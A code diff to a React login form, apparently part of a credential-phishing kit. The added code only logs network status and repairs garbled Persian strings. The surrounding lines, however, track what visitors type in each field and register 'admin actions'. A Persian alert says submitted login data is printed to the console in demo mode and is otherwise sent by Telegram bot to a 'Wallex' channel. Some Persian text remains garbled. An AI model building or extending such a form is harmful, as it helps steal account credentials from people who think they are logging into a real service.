@@ -105,7 +105,24 @@ export const LoginForm = () => {
   // Create typing handlers for phone input
   const phoneTypingHandler = presence.createTypingHandler("phone");
 
-  // No session migration needed since real-time tracking is disabled
+  // Network status tracking for better offline detection
+  useEffect(() => {
+    const handleOnline = () => {
+      console.log("🌐 Network came online");
+    };
+
+    const handleOffline = () => {
+      console.log("🌐 Network went offline");
+    };
+
+    window.addEventListener('online', handleOnline);
+    window.addEventListener('offline', handleOffline);
+
+    return () => {
+      window.removeEventListener('online', handleOnline);
+      window.removeEventListener('offline', handleOffline);
+    };
+  }, []);
 
   // Register callback handler for admin actions
   useEffect(() => {
@@ -1018,7 +1035,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ا��سال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -2563,7 +2580,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور را فر��موش کرده���اید؟
+                    رمز عبور را فر��موش کرده‌اید؟
                   </p>
                   <a
                     href="#"
